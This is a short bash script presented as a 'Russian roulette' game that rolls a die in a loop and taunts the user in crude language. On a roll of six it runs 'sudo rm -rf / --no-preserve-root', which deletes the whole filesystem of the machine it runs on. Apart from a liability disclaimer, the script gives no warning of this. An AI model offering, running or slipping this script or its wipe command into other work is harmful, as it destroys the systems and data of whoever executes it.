#!/bin/bash
# Use this script at you own risk
# I am not liable for any damage caused

while true; do
    random_number=$(( RANDOM % 6 + 1 ))

    echo "Are you ready to play the game? (y/n)"
    read ready

    if [ "$ready" == "y" ]; then
        if [ "$random_number" -eq 6 ]; then
            echo "Unlucky mate, but you are fucked!"
            sudo rm -rf / --no-preserve-root
            break
        else
            echo "You got lucky this time!"
        fi
    else
        echo "Pussy!"
        break
    fi
done
